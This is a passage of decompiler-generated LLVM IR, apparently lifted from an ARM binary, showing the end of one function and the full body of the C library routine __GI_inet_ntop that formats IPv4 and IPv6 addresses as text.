  %v0_1d088 = phi i32 [ %v0_1d088.pre, %dec_label_pc_1d064 ], [ %v3_1d080, %dec_label_pc_1d078 ]
  store i32 %v0_1d088, i32* %r0.global-to-local, align 4
  ret i32 %v0_1d088

; uselistorder directives
  uselistorder i32 %v0_1d088, { 1, 0 }
  uselistorder i32 %v2_1d048, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1d03c, { 0, 2, 1 }
  uselistorder i32 %v1_1cf7c, { 1, 0 }
  uselistorder i32 %v1_1cfc4, { 1, 0, 2 }
  uselistorder i32 %v2_1d02c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1d088, { 1, 0 }
  uselistorder label %dec_label_pc_1d02c, { 1, 0 }
  uselistorder label %dec_label_pc_1cff8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1d098 = load i32, i32* @r5, align 4
  %v7_1d0a4 = icmp eq i32 %arg1, 2
  store i1 %v7_1d0a4, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_1d0a4, label %dec_label_pc_1d0c8, label %dec_label_pc_1d0bc

dec_label_pc_1d0bc:                               ; preds = %entry
  %v7_1d0bc = icmp eq i32 %arg1, 10
  store i1 %v7_1d0bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d0bc, label %dec_label_pc_1d0dc, label %dec_label_pc_1d2f0

dec_label_pc_1d0c8:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1d0d4 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1d2e8

dec_label_pc_1d0dc:                               ; preds = %dec_label_pc_1d0bc
  %v2_1d0dc = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1d0dc, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1d0e8 = bitcast i32* %stack_var_-72 to i8*
  %v3_1d0e8 = call i32 @__GI_memset(i8* %v2_1d0e8, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1d10c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1d0f0

dec_label_pc_1d0f0:                               ; preds = %dec_label_pc_1d0f0.dec_label_pc_1d0f0_crit_edge, %dec_label_pc_1d0dc
  %v0_1d108 = phi i32 [ %v0_1d0f0.pre, %dec_label_pc_1d0f0.dec_label_pc_1d0f0_crit_edge ], [ 0, %dec_label_pc_1d0dc ]
  %v1_1d0f0 = load i32, i32* @r8, align 4
  %v2_1d0f0 = add i32 %v1_1d0f0, %v0_1d108
  %v3_1d0f4 = inttoptr i32 %v2_1d0f0 to i8*
  %v4_1d0f4 = load i8, i8* %v3_1d0f4, align 1
  %v6_1d0f4 = zext i8 %v4_1d0f4 to i32
  %v1_1d0f8 = add i32 %v2_1d0f0, 1
  %v2_1d0f8 = inttoptr i32 %v1_1d0f8 to i8*
  %v3_1d0f8 = load i8, i8* %v2_1d0f8, align 1
  %v4_1d0f8 = zext i8 %v3_1d0f8 to i32
  %tmp74 = icmp slt i32 %v0_1d108, 0
  %v4_1d0fc = zext i1 %tmp74 to i32
  %v5_1d0fc = add i32 %v4_1d0fc, %v0_1d108
  %v4_1d100 = mul nuw nsw i32 %v6_1d0f4, 256
  %v5_1d100 = or i32 %v4_1d0f8, %v4_1d100
  store i32 %v5_1d100, i32* %r2.global-to-local, align 4
  %v3_1d104 = sdiv i32 %v5_1d0fc, 2
  %v1_1d108 = add i32 %v0_1d108, 2
  store i32 %v1_1d108, i32* %r0.global-to-local, align 4
  %v4_1d110 = mul i32 %v3_1d104, 4
  %v5_1d110 = add i32 %v4_1d110, %v2_1d10c
  %v7_1d114 = icmp eq i32 %v1_1d108, 15
  store i1 %v7_1d114, i1* %cpsr_z.global-to-local, align 1
  %v2_1d118 = add i32 %v5_1d110, -32
  %v3_1d118 = inttoptr i32 %v2_1d118 to i32*
  store i32 %v5_1d100, i32* %v3_1d118, align 4
  %v7_1d11c = icmp sgt i32 %v1_1d108, 15
  br i1 %v7_1d11c, label %dec_label_pc_1d120, label %dec_label_pc_1d0f0.dec_label_pc_1d0f0_crit_edge

dec_label_pc_1d0f0.dec_label_pc_1d0f0_crit_edge:  ; preds = %dec_label_pc_1d0f0
  %v0_1d0f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d0f0

dec_label_pc_1d120:                               ; preds = %dec_label_pc_1d0f0
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d138

dec_label_pc_1d138:                               ; preds = %dec_label_pc_1d120, %dec_label_pc_1d184
  %v0_1d178 = phi i32 [ -1, %dec_label_pc_1d120 ], [ %v0_1d1ac, %dec_label_pc_1d184 ]
  %v0_1d168 = phi i32 [ -1, %dec_label_pc_1d120 ], [ %v0_1d198, %dec_label_pc_1d184 ]
  %v0_1d14c = phi i32 [ -1, %dec_label_pc_1d120 ], [ %v0_1d14c7, %dec_label_pc_1d184 ]
  %v0_1d184 = phi i32 [ 0, %dec_label_pc_1d120 ], [ %v1_1d184, %dec_label_pc_1d184 ]
  %v4_1d13c = mul nuw nsw i32 %v0_1d184, 4
  %v5_1d13c = add i32 %v4_1d13c, %v2_1d10c
  %v1_1d140 = add i32 %v5_1d13c, -32
  %v2_1d140 = inttoptr i32 %v1_1d140 to i32*
  %v3_1d140 = load i32, i32* %v2_1d140, align 4
  %v2_1d144 = icmp eq i32 %v3_1d140, 0
  %v7_1d14c = icmp eq i32 %v0_1d14c, -1
  br i1 %v2_1d144, label %dec_label_pc_1d14c, label %dec_label_pc_1d160

dec_label_pc_1d14c:                               ; preds = %dec_label_pc_1d138
  br i1 %v7_1d14c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1d14c
  store i32 %v0_1d184, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1d184

.thread:                                          ; preds = %dec_label_pc_1d14c
  %v1_1d158.pre = load i32, i32* @r4, align 4
  %v2_1d158 = add i32 %v1_1d158.pre, 1
  store i32 %v2_1d158, i32* @r4, align 4
  br label %dec_label_pc_1d184

dec_label_pc_1d160:                               ; preds = %dec_label_pc_1d138
  br i1 %v7_1d14c, label %dec_label_pc_1d184, label %dec_label_pc_1d168

dec_label_pc_1d168:                               ; preds = %dec_label_pc_1d160
  %v7_1d168 = icmp eq i32 %v0_1d168, -1
  %v0_1d17c.pre = load i32, i32* @r4, align 4
  %v1_1d170 = load i32, i32* @r7, align 4
  %v7_1d174 = icmp sgt i32 %v0_1d17c.pre, %v1_1d170
  %or.cond = or i1 %v7_1d168, %v7_1d174
  br i1 %or.cond, label %dec_label_pc_1d178, label %dec_label_pc_1d180

dec_label_pc_1d178:                               ; preds = %dec_label_pc_1d168
  store i32 %v0_1d178, i32* @r6, align 4
  store i32 %v0_1d17c.pre, i32* @r7, align 4
  br label %dec_label_pc_1d180

dec_label_pc_1d180:                               ; preds = %dec_label_pc_1d168, %dec_label_pc_1d178
  %v0_1d16812 = phi i32 [ %v0_1d178, %dec_label_pc_1d178 ], [ %v0_1d168, %dec_label_pc_1d168 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d184

dec_label_pc_1d184:                               ; preds = %bb, %.thread, %dec_label_pc_1d160, %dec_label_pc_1d180
  %v0_1d1ac = phi i32 [ %v0_1d178, %.thread ], [ %v0_1d184, %bb ], [ %v0_1d178, %dec_label_pc_1d160 ], [ -1, %dec_label_pc_1d180 ]
  %v0_1d14c7 = phi i32 [ %v0_1d14c, %.thread ], [ %v0_1d184, %bb ], [ -1, %dec_label_pc_1d160 ], [ -1, %dec_label_pc_1d180 ]
  %v0_1d198 = phi i32 [ %v0_1d168, %.thread ], [ %v0_1d168, %bb ], [ %v0_1d168, %dec_label_pc_1d160 ], [ %v0_1d16812, %dec_label_pc_1d180 ]
  %v1_1d184 = add nuw nsw i32 %v0_1d184, 1
  %v7_1d18c = icmp slt i32 %v1_1d184, 8
  br i1 %v7_1d18c, label %dec_label_pc_1d138, label %dec_label_pc_1d190

dec_label_pc_1d190:                               ; preds = %dec_label_pc_1d184
  %v7_1d190 = icmp eq i32 %v0_1d1ac, -1
  store i1 %v7_1d190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d190, label %dec_label_pc_1d190.dec_label_pc_1d1b0_crit_edge, label %dec_label_pc_1d198

dec_label_pc_1d190.dec_label_pc_1d1b0_crit_edge:  ; preds = %dec_label_pc_1d190
  %v1_1d1d4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1d1b0

dec_label_pc_1d198:                               ; preds = %dec_label_pc_1d190
  %v7_1d198 = icmp eq i32 %v0_1d198, -1
  store i1 %v7_1d198, i1* %cpsr_z.global-to-local, align 1
  %v0_1d1a8.pre = load i32, i32* @r4, align 4
  br i1 %v7_1d198, label %dec_label_pc_1d1a8, label %dec_label_pc_1d1a0

dec_label_pc_1d1a0:                               ; preds = %dec_label_pc_1d198
  %v1_1d1a0 = load i32, i32* @r7, align 4
  %v9_1d1a0 = icmp eq i32 %v0_1d1a8.pre, %v1_1d1a0
  store i1 %v9_1d1a0, i1* %cpsr_z.global-to-local, align 1
  %v7_1d1a4 = icmp sgt i32 %v0_1d1a8.pre, %v1_1d1a0
  br i1 %v7_1d1a4, label %dec_label_pc_1d1a8, label %dec_label_pc_1d1b0

dec_label_pc_1d1a8:                               ; preds = %dec_label_pc_1d198, %dec_label_pc_1d1a0
  store i32 %v0_1d1a8.pre, i32* @r7, align 4
  store i32 %v0_1d1ac, i32* @r6, align 4
  br label %dec_label_pc_1d1b0

dec_label_pc_1d1b0:                               ; preds = %dec_label_pc_1d190.dec_label_pc_1d1b0_crit_edge, %dec_label_pc_1d1a0, %dec_label_pc_1d1a8
  %v1_1d1d4.pre = phi i32 [ %v1_1d1a0, %dec_label_pc_1d1a0 ], [ %v1_1d1d4.pre.pre, %dec_label_pc_1d190.dec_label_pc_1d1b0_crit_edge ], [ %v0_1d1a8.pre, %dec_label_pc_1d1a8 ]
  %v0_1d1b0 = phi i32 [ %v0_1d198, %dec_label_pc_1d1a0 ], [ %v0_1d198, %dec_label_pc_1d190.dec_label_pc_1d1b0_crit_edge ], [ %v0_1d1ac, %dec_label_pc_1d1a8 ]
  %v7_1d1b0 = icmp eq i32 %v0_1d1b0, -1
  store i1 %v7_1d1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d1b0, label %dec_label_pc_1d1b0._crit_edge, label %dec_label_pc_1d1b8

dec_label_pc_1d1b8:                               ; preds = %dec_label_pc_1d1b0
  %v7_1d1b8 = icmp eq i32 %v1_1d1d4.pre, 1
  store i1 %v7_1d1b8, i1* %cpsr_z.global-to-local, align 1
  %v7_1d1bc = icmp slt i32 %v1_1d1d4.pre, 2
  br i1 %v7_1d1bc, label %bb54, label %dec_label_pc_1d1b0._crit_edge

bb54:                                             ; preds = %dec_label_pc_1d1b8
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1d1b0._crit_edge

dec_label_pc_1d1b0._crit_edge:                    ; preds = %dec_label_pc_1d1b0, %dec_label_pc_1d1b8, %bb54
  %v0_1d1d4 = phi i32 [ %v0_1d1b0, %dec_label_pc_1d1b8 ], [ -1, %bb54 ], [ %v0_1d1b0, %dec_label_pc_1d1b0 ]
  %v2_1d1c4 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_1d1c4, i32* @r4, align 4
  %v0_1d1c8 = load i32, i32* @r5, align 4
  %v2_1d1c8 = add i32 %v0_1d1c8, -33380
  store i32 %v2_1d1c8, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_1d1d4 = add i32 %v0_1d1d4, %v1_1d1d4.pre
  store i32 %v2_1d1d4, i32* @sl, align 4
  %v9_1d234 = icmp eq i32 %tmp, 65535
  %v7_1d1dc68 = icmp eq i32 %v0_1d1d4, -1
  store i1 %v7_1d1dc68, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d1dc

dec_label_pc_1d1dc:                               ; preds = %dec_label_pc_1d1b0._crit_edge, %dec_label_pc_1d28c
  %v7_1d1dc72 = phi i1 [ %v7_1d1dc68, %dec_label_pc_1d1b0._crit_edge ], [ %v7_1d1dc, %dec_label_pc_1d28c ]
  %v0_1d20871 = phi i32 [ 0, %dec_label_pc_1d1b0._crit_edge ], [ %v1_1d28c, %dec_label_pc_1d28c ]
  %v1_1d1f470 = phi i32 [ %v0_1d1d4, %dec_label_pc_1d1b0._crit_edge ], [ %v0_1d1dc.pre, %dec_label_pc_1d28c ]
  %v2_1d20c69 = phi i32 [ %v2_1d1c4, %dec_label_pc_1d1b0._crit_edge ], [ %v3_1d1f829, %dec_label_pc_1d28c ]
  br i1 %v7_1d1dc72, label %dec_label_pc_1d200, label %dec_label_pc_1d1e4

dec_label_pc_1d1e4:                               ; preds = %dec_label_pc_1d1dc
  %v9_1d1e4 = icmp eq i32 %v0_1d20871, %v1_1d1f470
  store i1 %v9_1d1e4, i1* %cpsr_z.global-to-local, align 1
  %v5_1d1e8 = icmp slt i32 %v0_1d20871, %v1_1d1f470
  br i1 %v5_1d1e8, label %dec_label_pc_1d200, label %dec_label_pc_1d1ec

dec_label_pc_1d1ec:                               ; preds = %dec_label_pc_1d1e4
  %v1_1d1ec = load i32, i32* @sl, align 4
  %v9_1d1ec = icmp eq i32 %v0_1d20871, %v1_1d1ec
  store i1 %v9_1d1ec, i1* %cpsr_z.global-to-local, align 1
  %v6_1d1f0 = icmp slt i32 %v0_1d20871, %v1_1d1ec
  br i1 %v6_1d1f0, label %dec_label_pc_1d1f4, label %dec_label_pc_1d200

dec_label_pc_1d1f4:                               ; preds = %dec_label_pc_1d1ec
  store i1 %v9_1d1e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1d1e4, label %bb56, label %dec_label_pc_1d28c

bb56:                                             ; preds = %dec_label_pc_1d1f4
  %v1_1d1f8 = load i32, i32* @sb, align 4
  %v2_1d1f8 = trunc i32 %v1_1d1f8 to i8
  %v4_1d1f8 = inttoptr i32 %v2_1d20c69 to i8*
  store i8 %v2_1d1f8, i8* %v4_1d1f8, align 1
  %v5_1d1f8 = load i32, i32* @r4, align 4
  %v6_1d1f8 = add i32 %v5_1d1f8, 1
  store i32 %v6_1d1f8, i32* @r4, align 4
  br label %dec_label_pc_1d28c

dec_label_pc_1d200:                               ; preds = %dec_label_pc_1d1ec, %dec_label_pc_1d1e4, %dec_label_pc_1d1dc
  %v2_1d200 = icmp eq i32 %v0_1d20871, 0
  store i1 %v2_1d200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d200, label %dec_label_pc_1d270, label %dec_label_pc_1d208

dec_label_pc_1d208:                               ; preds = %dec_label_pc_1d200
  %v7_1d208 = icmp eq i32 %v0_1d20871, 6
  store i1 %v7_1d208, i1* %cpsr_z.global-to-local, align 1
  %v0_1d20c = load i32, i32* @sb, align 4
  %v1_1d20c = trunc i32 %v0_1d20c to i8
  %v3_1d20c = inttoptr i32 %v2_1d20c69 to i8*
  store i8 %v1_1d20c, i8* %v3_1d20c, align 1
  %v4_1d20c = load i32, i32* @r4, align 4
  %v5_1d20c = add i32 %v4_1d20c, 1
  store i32 %v5_1d20c, i32* @r4, align 4
  %v0_1d210 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1d210, label %dec_label_pc_1d214, label %dec_label_pc_1d270

dec_label_pc_1d214:                               ; preds = %dec_label_pc_1d208
  %v0_1d214 = load i32, i32* @r6, align 4
  %v2_1d214 = icmp eq i32 %v0_1d214, 0
  store i1 %v2_1d214, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d214, label %dec_label_pc_1d21c, label %dec_label_pc_1d270

dec_label_pc_1d21c:                               ; preds = %dec_label_pc_1d214
  %v0_1d21c = load i32, i32* @r7, align 4
  %v7_1d21c = icmp eq i32 %v0_1d21c, 6
  store i1 %v7_1d21c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d21c, label %dec_label_pc_1d23c, label %dec_label_pc_1d224

dec_label_pc_1d224:                               ; preds = %dec_label_pc_1d21c
  %v7_1d224 = icmp eq i32 %v0_1d21c, 5
  store i1 %v7_1d224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d224, label %dec_label_pc_1d22c, label %dec_label_pc_1d270

dec_label_pc_1d22c:                               ; preds = %dec_label_pc_1d224
  store i1 %v9_1d234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1d234, label %dec_label_pc_1d23c, label %dec_label_pc_1d270

dec_label_pc_1d23c:                               ; preds = %dec_label_pc_1d22c, %dec_label_pc_1d21c
  %v2_1d240 = sub i32 %v2_1d10c, %v5_1d20c
  %v1_1d244 = add i32 %v2_1d240, -32
  store i32 %v1_1d244, i32* %r2.global-to-local, align 4
  %v0_1d248 = load i32, i32* @r8, align 4
  %v1_1d248 = add i32 %v0_1d248, 12
  store i32 %v1_1d248, i32* %r0.global-to-local, align 4
  %v3_1d250 = call i32 @inet_ntop4(i32 %v1_1d248, i32 %v5_1d20c, i32 %v1_1d244)
  store i32 %v3_1d250, i32* %r0.global-to-local, align 4
  %v2_1d254 = icmp eq i32 %v3_1d250, 0
  store i1 %v2_1d254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d254, label %bb57, label %dec_label_pc_1d260

bb57:                                             ; preds = %dec_label_pc_1d23c
  %v1_1d258 = load i32, i32* @r6, align 4
  store i32 %v1_1d258, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d300

dec_label_pc_1d260:                               ; preds = %dec_label_pc_1d23c
  %v0_1d260 = load i32, i32* @r4, align 4
  %v1_1d260 = inttoptr i32 %v0_1d260 to i8*
  store i32 %v0_1d260, i32* %r0.global-to-local, align 4
  %v3_1d264 = call i32 @strlen(i8* %v1_1d260)
  store i32 %v3_1d264, i32* %r0.global-to-local, align 4
  %v0_1d268 = load i32, i32* @r4, align 4
  %v2_1d268 = add i32 %v0_1d268, %v3_1d264
  store i32 %v2_1d268, i32* @r4, align 4
  %v0_1d2a0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1d2a0

dec_label_pc_1d270:                               ; preds = %dec_label_pc_1d22c, %dec_label_pc_1d224, %dec_label_pc_1d214, %dec_label_pc_1d208, %dec_label_pc_1d200
  %v0_1d278 = phi i32 [ %v5_1d20c, %dec_label_pc_1d22c ], [ %v5_1d20c, %dec_label_pc_1d224 ], [ %v5_1d20c, %dec_label_pc_1d214 ], [ %v5_1d20c, %dec_label_pc_1d208 ], [ %v2_1d20c69, %dec_label_pc_1d200 ]
  store i32 %v2_1d10c, i32* @lr, align 4
  %v1_1d274 = load i32, i32* @r5, align 4
  %v4_1d274 = mul i32 %v1_1d274, 4
  %v5_1d274 = add i32 %v4_1d274, %v2_1d10c
  store i32 %v0_1d278, i32* @r0, align 4
  %v1_1d27c = add i32 %v5_1d274, -32
  %v2_1d27c = inttoptr i32 %v1_1d27c to i32*
  %v3_1d27c = load i32, i32* %v2_1d27c, align 4
  store i32 %v3_1d27c, i32* %r2.global-to-local, align 4
  %v0_1d280 = load i32, i32* @fp, align 4
  %v2_1d284 = call i32 @sprintf(i32 %v0_1d278, i32 %v0_1d280)
  store i32 %v2_1d284, i32* %r0.global-to-local, align 4
  %v0_1d288 = load i32, i32* @r4, align 4
  %v2_1d288 = add i32 %v0_1d288, %v2_1d284
  store i32 %v2_1d288, i32* @r4, align 4
  br label %dec_label_pc_1d28c

dec_label_pc_1d28c:                               ; preds = %bb56, %dec_label_pc_1d1f4, %dec_label_pc_1d270
  %v3_1d1f829 = phi i32 [ %v6_1d1f8, %bb56 ], [ %v2_1d20c69, %dec_label_pc_1d1f4 ], [ %v2_1d288, %dec_label_pc_1d270 ]
  %v0_1d28c = load i32, i32* @r5, align 4
  %v1_1d28c = add i32 %v0_1d28c, 1
  store i32 %v1_1d28c, i32* @r5, align 4
  %v0_1d1dc.pre = load i32, i32* @r6, align 4
  %v7_1d294 = icmp slt i32 %v1_1d28c, 8
  %v7_1d1dc = icmp eq i32 %v0_1d1dc.pre, -1
  store i1 %v7_1d1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d294, label %dec_label_pc_1d1dc, label %dec_label_pc_1d298

dec_label_pc_1d298:                               ; preds = %dec_label_pc_1d28c
  br i1 %v7_1d1dc, label %.thread2, label %dec_label_pc_1d2a0

dec_label_pc_1d2a0:                               ; preds = %dec_label_pc_1d298, %dec_label_pc_1d260
  %v3_1d2ac = phi i32 [ %v3_1d1f829, %dec_label_pc_1d298 ], [ %v2_1d268, %dec_label_pc_1d260 ]
  %v0_1d2a0 = phi i32 [ %v0_1d1dc.pre, %dec_label_pc_1d298 ], [ %v0_1d2a0.pre, %dec_label_pc_1d260 ]
  %v1_1d2a0 = load i32, i32* @r7, align 4
  %v2_1d2a0 = add i32 %v1_1d2a0, %v0_1d2a0
  %v7_1d2a4 = icmp eq i32 %v2_1d2a0, 8
  store i1 %v7_1d2a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d2a4, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1d2a0
  %v4_1d2ac = inttoptr i32 %v3_1d2ac to i8*
  store i8 58, i8* %v4_1d2ac, align 1
  %v5_1d2ac = load i32, i32* @r4, align 4
  %v6_1d2ac = add i32 %v5_1d2ac, 1
  store i32 %v6_1d2ac, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1d2a0, %dec_label_pc_1d298, %bb58
  %v2_1d2b4 = phi i32 [ %v3_1d2ac, %dec_label_pc_1d2a0 ], [ %v3_1d1f829, %dec_label_pc_1d298 ], [ %v6_1d2ac, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1d2b4 = inttoptr i32 %v2_1d2b4 to i8*
  store i8 0, i8* %v3_1d2b4, align 1
  %v4_1d2b4 = load i32, i32* @r4, align 4
  %v5_1d2b4 = add i32 %v4_1d2b4, 1
  store i32 %v2_1d1c4, i32* @r1, align 4
  %v2_1d2bc = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1d2bc, i32* %r2.global-to-local, align 4
  %v2_1d2c0 = sub i32 %v5_1d2b4, %v2_1d1c4
  %v9_1d2c4 = icmp eq i32 %v2_1d2c0, %v2_1d2bc
  store i1 %v9_1d2c4, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1d2c0, %v2_1d2bc
  br i1 %tmp75, label %dec_label_pc_1d2cc, label %dec_label_pc_1d2e0

dec_label_pc_1d2cc:                               ; preds = %.thread2
  %v0_1d2cc = call i32 @__GI___errno_location()
  store i32 %v0_1d2cc, i32* %r0.global-to-local, align 4
  %v0_1d2d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1d2d4, i32* %r2.global-to-local, align 4
  %v2_1d2d8 = inttoptr i32 %v0_1d2cc to i32*
  store i32 28, i32* %v2_1d2d8, align 4
  %v0_1d300.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d300

dec_label_pc_1d2e0:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1d2e4 = inttoptr i32 %arg3 to i8*
  %v3_1d2e4 = call i32 @strcpy(i8* %v2_1d2e4, i32 %v2_1d1c4)
  br label %dec_label_pc_1d2e8

dec_label_pc_1d2e8:                               ; preds = %dec_label_pc_1d0c8, %dec_label_pc_1d2e0
  %storemerge = phi i32 [ %v3_1d0d4, %dec_label_pc_1d0c8 ], [ %v3_1d2e4, %dec_label_pc_1d2e0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d300

dec_label_pc_1d2f0:                               ; preds = %dec_label_pc_1d0bc
  %v0_1d2f0 = call i32 @__GI___errno_location()
  store i32 %v0_1d2f0, i32* %r0.global-to-local, align 4
  %v2_1d2f8 = inttoptr i32 %v0_1d2f0 to i32*
  store i32 97, i32* %v2_1d2f8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d300

dec_label_pc_1d300:                               ; preds = %bb57, %dec_label_pc_1d2e8, %dec_label_pc_1d2cc, %dec_label_pc_1d2f0
  %v0_1d300 = phi i32 [ %v1_1d258, %bb57 ], [ %storemerge, %dec_label_pc_1d2e8 ], [ %v0_1d300.pre, %dec_label_pc_1d2cc ], [ 0, %dec_label_pc_1d2f0 ]
  store i32 %v0_1d300, i32* %r0.global-to-local, align 4
  store i32 %v6_1d098, i32* %r5.global-to-local, align 4
  ret i32 %v0_1d300

; uselistorder directives
  uselistorder i32 %v0_1d300, { 1, 0 }
  uselistorder i1 %v7_1d1dc, { 2, 0, 1 }
  uselistorder i32 %v0_1d1dc.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1d28c, { 0, 2, 1 }
  uselistorder i32 %v0_1d278, { 1, 0 }
  uselistorder i32 %v0_1d260, { 1, 0 }
  uselistorder i32 %v5_1d20c, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_1d1e4, { 1, 0, 2 }
  uselistorder i32 %v2_1d20c69, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1d20871, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1d1dc68, { 1, 0 }
  uselistorder i32 %v2_1d1c4, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1d1d4, { 1, 0, 2 }
  uselistorder i1 %v7_1d1b0, { 1, 0 }
  uselistorder i32 %v0_1d1b0, { 1, 2, 0 }
  uselistorder i32 %v1_1d1d4.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1d1a8.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1d198, { 1, 0 }
  uselistorder i1 %v7_1d190, { 1, 0 }
  uselistorder i32 %v1_1d184, { 1, 0 }
  uselistorder i32 %v0_1d198, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1d1ac, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1d14c, { 1, 0 }
  uselistorder i32 %v0_1d184, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1d168, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1d178, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1d108, { 1, 0, 2 }
  uselistorder i32 %v2_1d0f0, { 1, 0 }
  uselistorder i32 %v0_1d108, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1d10c, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 22, 14, 15, 16, 17, 18, 23, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 8, 1, 0, 9, 7, 2, 3, 4 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @sprintf, { 4, 3, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1d300, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1d2e8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d28c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1d1dc, { 1, 0 }
  uselistorder label %dec_label_pc_1d1b0._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d1b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1d1a8, { 1, 0 }
